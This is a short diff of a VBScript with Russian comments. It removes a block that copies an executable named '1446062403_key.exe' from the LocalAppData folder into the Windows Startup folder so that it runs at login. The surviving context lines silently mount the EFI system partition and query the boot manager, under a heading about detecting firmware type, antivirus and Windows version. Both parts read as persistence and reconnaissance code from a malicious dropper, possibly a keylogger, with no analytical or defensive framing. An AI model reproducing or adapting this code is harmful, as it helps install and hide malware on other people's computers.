@@ -1,19 +1,3 @@
-' ===== ДОБАВЛЕНИЕ EXE В АВТОЗАГРУЗКУ =====
-Dim objAutoShell, strLocalAppDataPath, strExePath, strStartupFolderPath
-Set objAutoShell = CreateObject("WScript.Shell")
-strLocalAppDataPath = objAutoShell.ExpandEnvironmentStrings("%LocalAppData%")
-strExePath = strLocalAppDataPath & "\1446062403_key.exe"
-
-If objFileSystemObject.FileExists(strExePath) Then
-    strStartupFolderPath = objAutoShell.SpecialFolders("Startup") & "\1446062403_key.exe"
-    If Not objFileSystemObject.FileExists(strStartupFolderPath) Then
-        objFileSystemObject.CopyFile strExePath, strStartupFolderPath
-    End If
-End If
-
-Set objAutoShell = Nothing
-
-
 ' ===== ОПРЕДЕЛЕНИЕ BIOS/UEFI, АНТИВИРУСА, ВЕРСИИ WINDOWS =====
 mountResult = objShell.Run("cmd /c mountvol S: /S", 0, True)
 bcdeditResult = objShell.Run("cmd /c bcdedit /enum | find ""path"" | find ""bootmgfw.efi""", 0, True)
